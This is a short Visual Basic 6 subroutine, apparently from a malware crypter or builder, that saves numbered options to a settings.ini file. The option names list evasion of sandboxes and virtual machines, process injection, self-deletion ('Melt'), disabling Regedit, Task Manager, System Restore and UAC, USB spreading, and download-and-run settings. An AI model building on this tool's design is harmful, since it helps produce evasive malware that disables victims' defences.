Private Sub Record_Setting(ByVal sNum As Integer, sVal As String)
    Dim Record_Settings(999) As String
    
     If m_Record Then
    
    Record_Settings(1) = "Anti Sandboxie"
    Record_Settings(2) = "Anti Anubis"
    Record_Settings(3) = "Anti Vmware"
    Record_Settings(4) = "Anti VirtualPc"
    Record_Settings(5) = "Anti CwsSandbox"
    Record_Settings(6) = "Anti VirtualBox"
    Record_Settings(7) = "Anti JoeBox"
    Record_Settings(8) = "Anti ThreatExpert"
    Record_Settings(9) = "Anti Panda"
    Record_Settings(10) = "Anti Sunbelt"
    Record_Settings(11) = "Enable Message"
    Record_Settings(12) = "Play Message"
    Record_Settings(13) = "Message Body"
    Record_Settings(14) = "Message Title"
    Record_Settings(15) = "Delay Runtime"
    Record_Settings(16) = "Melt"
    Record_Settings(17) = "Inject"
    Record_Settings(18) = "Add Bytes"
    Record_Settings(19) = "Enable Add Data"
    Record_Settings(20) = "Regedit"
    Record_Settings(21) = "Task Mgr"
    Record_Settings(22) = "System Restore"
    Record_Settings(23) = "Start Button"
    Record_Settings(24) = "MsConfig"
    Record_Settings(25) = "Download URL"
    Record_Settings(26) = "Download Extension"
    Record_Settings(27) = "Enable Download"
    Record_Settings(28) = "Add Bytes"
    Record_Settings(29) = "Enable Bytes"
    Record_Settings(30) = "Disable UAC"
    Record_Settings(31) = "Version Info"
    Record_Settings(32) = "USB"
    Record_Settings(33) = "DlFile"
    Record_Settings(34) = "DlExt"
    Record_Settings(35) = "DlDelay"
    Record_Settings(36) = "DlDelayTime"
    Record_Settings(37) = "DlInjExt"
    Record_Settings(38) = "DlIEC"
    Record_Settings(39) = "Stub"
    
    WriteIniValue App.Path & "\settings.ini", "Settings", Record_Settings(sNum), sVal

    Else
    End If
End Sub


